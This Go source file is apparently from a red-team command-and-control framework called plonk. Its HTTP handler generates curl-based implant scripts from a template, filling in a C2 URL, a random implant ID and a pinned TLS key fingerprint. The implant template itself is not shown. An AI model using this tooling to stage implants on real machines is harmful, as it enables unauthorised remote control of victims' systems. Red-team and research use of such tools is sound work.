package implantsvr

/*
 * handlers.go
 * HTTP Handlers
 * By J. Stuart McMurray
 * Created 20231208
 * Last Modified 20231218
 */

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	_ "embed"
	"encoding/base64"
	"errors"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"text/template"

	"github.com/magisterquis/plonk/internal/def"
	"github.com/magisterquis/plonk/lib/eztls"
	"github.com/magisterquis/plonk/lib/plog"
	"golang.org/x/net/idna"
)

var (
	// rawTemplate is the stock implant generation template.
	//
	//go:embed curlgen.tmpl
	RawTemplate string

	// tmpl is the parsed stock template.
	ptmpl = template.Must(template.New("curlgen").Parse(RawTemplate))
)

// TemplateParams holds the parameters we pass to the template.
type TemplateParams struct {
	PubkeyFP string `json:",omitempty"` /* Self-signed TLS fingerprint. */
	RandN    string /* Random base36 number, for ImplantID */
	URL      string /* C2 URL for /{t,o}/ImplantID */
}

// handleCurlGen handles a request for a curl-based implant generation
func (s *Server) handleCurlGen(w http.ResponseWriter, r *http.Request) {
	sl := s.requestLogger(r)

	/* Work out the template to use. */
	var tmpl *template.Template
	fn := filepath.Join(s.Dir, def.TemplateFile)
	if b, err := os.ReadFile(fn); errors.Is(err, os.ErrNotExist) {
		/* No new template. */
		tmpl = ptmpl
	} else if nil == err {
		sl = sl.With(def.LKFilename, fn)
		/* User gave us one. */
		tmpl, err = template.New("loaded").Parse(string(b))
		if nil != err {
			plog.ErrorError(
				sl, def.LMCurlGen, fmt.Errorf(
					"parsing: %w",
					err,
				),
			)
			return
		}
	} else {
		plog.ErrorError(
			sl, def.LMCurlGen, fmt.Errorf(
				"reading template: %w",
				err,
			),
			def.LKFilename, fn,
		)
		return
	}

	/* If we've connected to a self-signed cert, also include the hash. */
	var fp string
	if nil != r.TLS {
		/* Get the cert we gave the client.  Should be cached and not
		terribly slow. */
		c, err := s.cg(&tls.ClientHelloInfo{
			ServerName: r.TLS.ServerName,
		})
		if nil != err {
			plog.ErrorError(sl, def.LMCurlGen, fmt.Errorf(
				"getting certificate for %q: %s",
				r.TLS.ServerName,
				err,
			))
			return
		}
		/* If it's the self-signed cert, work out the pubkey
		fingerprint, for curl --pinnedpubkey. */
		if nil != c.Leaf &&
			eztls.SelfSignedSubject == c.Leaf.Subject.CommonName {
			var err error
			fp, err = pubkeyFingerprint(c)
			if nil != err {
				plog.ErrorError(sl, def.LMCurlGen, fmt.Errorf(
					"generating pubkey hash: %w",
					err,
				))
			}
		}
	}

	/* Generate template parameters. */
	c2, err := c2URL(r)
	if nil != err {
		plog.ErrorError(sl, def.LMCurlGen, fmt.Errorf(
			"determining URL: %w",
			err,
		))
		return
	}
	params := TemplateParams{
		PubkeyFP: fp,
		RandN:    strconv.FormatUint(rand.Uint64()&0xFFFF, 36),
		URL:      c2,
	}
	sl = sl.With(def.LKParameters, params)

	/* Execute the template and send it back. */
	var b bytes.Buffer
	if err := tmpl.Execute(&b, params); nil != err {
		plog.ErrorError(sl, def.LMCurlGen, fmt.Errorf(
			"executing template: %w",
			err,
		))
	}
	b.WriteTo(w)

	sl.Info(def.LMCurlGen)
}

// c2URL tries to get a C2 URl from r.  We try a query/form parameter, a
// c2: header, the Host: header, and the SNI, in that order.
func c2URL(r *http.Request) (string, error) {
	/* Work out the protocol we'll eventually use. */
	proto := "http://"
	if nil != r.TLS {
		proto = "https://"
	}

	/* Parse the query and form and try to get it from there. */
	if err := r.ParseForm(); nil != err {
		return "", fmt.Errorf("parsing request: %w", err)
	}
	if p := r.Form.Get(def.C2URLParam); "" != p {
		return proto + p, nil
	}

	/* Try to get it as a header. */
	if p := r.Header.Get(def.C2URLParam); "" != p {
		return proto + p, nil
	}

	/* Failing that, try the Host: header. */
	if p, err := idna.ToASCII(r.Host); nil != err {
		return "", fmt.Errorf("punycoding %s: %w", r.Host, err)
	} else if "" != p {
		return proto + p, nil
	}

	/* No Host: header.  Probably HTTP/1.0.  Try the SNI. */
	if p := r.TLS.ServerName; "" != p {
		return proto + p, nil
	}

	/* Out of ideas at this point. */
	return "", errors.New("out of ideas")
}

// pubkeyFingerprint returns the SHA256 hash of the public key fingerprint
// for the cert.  This is used for curl's --pinnedpubkey.  If the certificate's
// Leaf isn't set, an error is returned.
func pubkeyFingerprint(cert *tls.Certificate) (string, error) {
	/* Make sure we have a parsed cert. */
	if nil == cert.Leaf {
		return "", errors.New("certificate not parsed")
	}

	/* Marshal to nicely-hashable DER. */
	b, err := x509.MarshalPKIXPublicKey(cert.Leaf.PublicKey)
	if nil != err {
		return "", fmt.Errorf("marshalling to DER: %w", err)
	}

	/* Hash and encode. */
	h := sha256.Sum256(b)
	return base64.StdEncoding.EncodeToString(h[:]), nil
}
